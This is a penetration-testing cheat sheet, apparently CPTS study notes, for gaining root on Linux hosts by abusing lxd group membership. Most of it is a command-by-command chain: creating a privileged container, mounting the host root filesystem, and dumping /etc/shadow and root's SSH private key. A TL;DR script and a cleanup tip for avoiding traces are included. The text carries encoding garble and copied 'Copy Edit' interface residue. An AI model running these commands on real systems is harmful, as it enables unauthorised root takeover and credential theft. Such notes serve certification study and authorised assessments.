ğŸ” Containers â€“ CPTS Privilege Escalation Summary
High-level idea:
If youâ€™re a member of the lxd or lxc group â€” you can bypass host protections and become root by mounting the hostâ€™s root filesystem into a privileged container.

ğŸ§  What Youâ€™re Looking For
ğŸ” Run this first:

bash
Copy
Edit
id
âœ… If output shows you're in the lxd group:

bash
Copy
Edit
uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
ğŸŸ¢ You're in business. Time to escalate.

ğŸ§± LXD Privilege Escalation: Step-by-Step
âœ… Step 1 â€“ Confirm Membership
bash
Copy
Edit
id | grep lxd
âœ… Step 2 â€“ Import a Writable Container Image
If ubuntu-template.tar.xz or similar is already available:

bash
Copy
Edit
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
If not, you can download and transfer a prebuilt image to the victim box:

Download from attacker box:
https://images.linuxcontainers.org

Upload using scp, wget, or python3 -m http.server

âœ… Step 3 â€“ Initialize a Privileged Container
bash
Copy
Edit
lxc init ubuntutemp privesc -c security.privileged=true
security.privileged=true disables all isolation. You're effectively root on host inside the container.

âœ… Step 4 â€“ Mount Host Filesystem
bash
Copy
Edit
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
This mounts the hostâ€™s / to /mnt/root inside the container.

âœ… Step 5 â€“ Start & Enter the Container
bash
Copy
Edit
lxc start privesc
lxc exec privesc /bin/bash
Inside the container:

bash
Copy
Edit
cd /mnt/root/root
cat /mnt/root/etc/shadow
cat /mnt/root/root/.ssh/id_rsa
ğŸ”¥ Youâ€™re effectively root on the host. You can:

Copy SSH keys

Reset root password

Dump /etc/shadow

Edit crontabs, sudoers, etc.

ğŸ›¡ï¸ What Makes This Dangerous?
No password needed â€” just group membership

Mounting host FS gives full control

LXD group is often overlooked in hardening

Easy to automate and chain

âš ï¸ OPSEC Tip:
If you exploit this in a real-world assessment:

Clean up container afterward (lxc delete privesc --force)

Watch for logging in /var/log/lxd/

ğŸ” TL;DR Workflow
bash
Copy
Edit
# Check group
id | grep lxd

# Import container image
lxc image import ubuntu-template.tar.xz --alias ubuntutemp

# Create privileged container
lxc init ubuntutemp privesc -c security.privileged=true

# Mount host FS
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

# Start and enter
lxc start privesc
lxc exec privesc /bin/bash
cd /mnt/root
ğŸ’€ "If This, Then That" â€“ Container Escalation Flow
text
Copy
Edit
IF user is in `lxd` group
    THEN import or upload an image
        AND initialize a privileged container
        AND mount host root
        AND execute shell
        THEN access /mnt/root as root on host
